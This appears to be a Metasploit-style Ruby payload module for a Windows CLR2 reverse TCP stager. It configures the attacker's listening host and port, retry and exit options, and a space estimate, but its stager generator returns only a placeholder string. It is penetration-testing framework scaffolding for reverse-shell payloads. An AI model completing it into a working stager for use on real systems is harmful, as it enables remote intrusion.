# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'

module Msf

###
#
# Complex reverse_tcp payload generation for Windows ARCH_CLR2.
#
###

module Payload::Clr2::ReverseTcp

  include Msf::Payload::TransportConfig
  include Msf::Payload::Clr2

  #
  # Register reverse tcp specific options
  #
  def initialize(*args)
    super
    register_advanced_options([ OptString.new('PayloadBindPort', [false, 'Port to bind reverse tcp socket to on target system.']) ], self.class)
  end

  #
  # Generate the first stage
  #
  def generate(opts={})
    ds = opts[:datastore] || datastore
    conf = {
      port:        ds['LPORT'],
      host:        ds['LHOST'],
      retry_count: ds['ReverseConnectRetries'],
      bind_port:   ds['PayloadBindPort'],
      reliable:    false
    }

    # Generate the advanced stager if we have space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = ds['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_tcp(opts={})
    'THIS IS WHERE THE STAGER PAYLOAD GOES'
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # EXITFUNK 'thread' is the biggest by far, adds 29 bytes.
    space += 29

    # Reliability adds some bytes!
    space += 44

    space += uuid_required_size if include_send_uuid

    # The final estimated size
    space
  end

end

end
